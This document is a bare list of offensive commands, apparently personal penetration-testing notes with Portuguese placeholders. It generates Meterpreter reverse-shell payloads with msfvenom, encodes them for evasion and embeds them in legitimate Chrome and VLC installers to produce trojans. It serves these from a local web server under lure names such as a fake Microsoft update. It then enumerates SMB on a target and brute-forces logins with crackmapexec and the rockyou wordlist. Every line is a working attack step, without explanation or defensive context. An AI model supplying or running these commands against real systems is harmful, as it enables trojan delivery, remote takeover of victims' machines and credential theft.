msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.137 LPORT=443 -f exe -x ChromeSetup.exe -o chrome_infectado.exe

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<seu_ip> LPORT=443 -f exe -x vlc_setup.exe -o vlc_infectado.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe > trojan.exe


python3 -m http.server 8080

http://192.168.1.137:8080/vlc_infectado.exe

http://192.168.1.137:8080/documento_infectado.rtf

http://192.168.1.137:8080/microsoft_update.page.zip

sudo cp -r /caminho/para/conectasocial_advanced /var/www/html/

Get-NetAdapter -Physical | Where-Object {$_.Status -eq "Up"}


python3 /usr/share/doc/python3-impacket/examples/smbclient.py administrador@192.168.1.84

nmap -Pn -p 139,445 --script smb-protocols,smb-security-mode,smb2-security-mode 192.168.1.84


crackmapexec smb 192.168.1.84 -u convidado -p ""

crackmapexec smb 192.168.1.84 -u root -P /usr/share/wordlists/rockyou.txt






